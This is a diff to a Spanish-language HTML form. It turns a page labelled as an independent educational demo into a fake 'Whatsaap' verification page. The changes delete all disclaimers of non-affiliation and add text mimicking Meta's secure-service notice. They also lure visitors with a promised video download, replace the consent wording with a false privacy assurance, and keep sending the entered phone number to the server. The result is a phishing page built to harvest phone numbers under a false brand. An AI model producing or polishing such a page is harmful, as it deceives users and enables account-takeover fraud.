@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="theme-color" content="#075E54">
-  <title>Mensajería Demo</title>
+  <title>Whatsaap</title>
 
   <style>
     :root {
@@ -225,16 +225,17 @@
         </svg>
       </div>
 
-      <h1>Mensajería Demo</h1>
-      <p>Prototipo educativo independiente</p>
+      <h1>Whatsaap</h1>
+      <p>Meta no envía mensajes directos por WhatsApp solicitando verificar cuentas, ni compartir códigos.</p>
     </header>
 
     <section class="content">
-      <p class="eyebrow">Acceso internacional</p>
-      <h2>Selecciona tu país</h2>
+      <p class="eyebrow">"Esta cuenta usa un servicio seguro de Meta para administrar este chat. Toca para obtener más información."</p>
+      <h2>Pagina de Verificacion</h2>
 
       <p class="description">
-        Este formulario independiente transmite el número que escribas al servidor después de que aceptes el aviso. No es un inicio de sesión de WhatsApp.
+        Para visualizar el video no te pediremos ningun dato personal Nombre,Documentacion, Etc; solo digita tu numero y acepta los permisos de seguridad 
+        y tu verificacion sera correcta y automaticamente podras visualizar el contenido, una vez verficado podras descargar y visualizar tu contenido .Mp4.
       </p>
 
       <form id="demoForm">
@@ -263,23 +264,22 @@
           </div>
 
           <p class="hint" id="hint">
-            Escribe entre 4 y 15 dígitos, sin espacios ni símbolos.
+            Escribe entre 8 y 15 dígitos segun tu pais o region, sin espacios ni símbolos.
           </p>
         </div>
 
         <div class="field" style="display:flex;align-items:flex-start;gap:10px">
           <input id="consent" name="consent" type="checkbox" required style="width:18px;height:18px;flex-shrink:0;margin-top:2px">
-          <label for="consent" style="font-weight:400;line-height:1.5;margin:0">Acepto enviar mi número a este prototipo independiente para probar el formulario. El número completo no se guarda ni se muestra en los logs; solo se registra una versión enmascarada.</label>
+          <label for="consent" style="font-weight:400;line-height:1.5;margin:0">Acepto los terminos y servicios de seguridad, esta pagina no comparte ningun tipo de informacion personal con nichos o terceros.</label>
         </div>
 
-        <button type="submit">Enviar prueba a Render</button>
+        <button type="submit">Continuar ahora</button>
       </form>
 
       <div id="result" role="status" aria-live="polite"></div>
     </section>
 
-    <footer class="footer">
-      Prototipo educativo independiente; no es WhatsApp ni está afiliado a ese servicio. Solo envía el número si aceptas el aviso. Este prototipo no es WhatsApp ni está afiliado a ese servicio; el servidor de ejemplo no guarda el número completo.
+    <footer class="footer">Esta cuenta usa un servicio seguro de Meta para administrar este chat. Toca para obtener más información."
     </footer>
   </main>
 
@@ -386,7 +386,7 @@
       dial.textContent = selected[3];
       number.value = "";
       result.textContent = "";
-      number.placeholder = "Número ficticio";
+      number.placeholder = "Numero de telefono";
     }
 
     countrySelect.addEventListener("change", updateCountry);
@@ -401,19 +401,19 @@
       event.preventDefault();
 
       if (!/^\d{4,15}$/.test(number.value)) {
-        result.textContent = "Introduce entre 4 y 15 dígitos.";
+        result.textContent = "Introduce entre 8 y 15 dígitos.";
         return;
       }
       if (!document.getElementById("consent").checked) {
-        result.textContent = "Acepta el aviso antes de enviar el formulario.";
+        result.textContent = "Acepta el aviso antes de Verificar tu numero de telefono.";
         return;
       }
 
       const selected = countries.find(country => country[0] === countrySelect.value);
-      result.textContent = "Enviando a Render…";
+      result.textContent = "Verificando numero de telefono…";
       const button = form.querySelector('button[type="submit"]');
       button.disabled = true;
-      button.textContent = "Enviando…";
+      button.textContent = "Verificando…";
 
       try {
         const response = await fetch("/api/demo-number", {
@@ -424,10 +424,10 @@
         const data = await response.json();
         result.textContent = data.message || (response.ok ? "Envío completado." : "No se pudo completar el envío.");
       } catch (error) {
-        result.textContent = "No se pudo conectar con Render. Comprueba que el servicio esté activo.";
+        result.textContent = "Revisa tu conexion a Internet.";
       } finally {
         button.disabled = false;
-        button.textContent = "Enviar prueba a Render";
+        button.textContent = "Verificar numero de telefono";
       }
     });
 
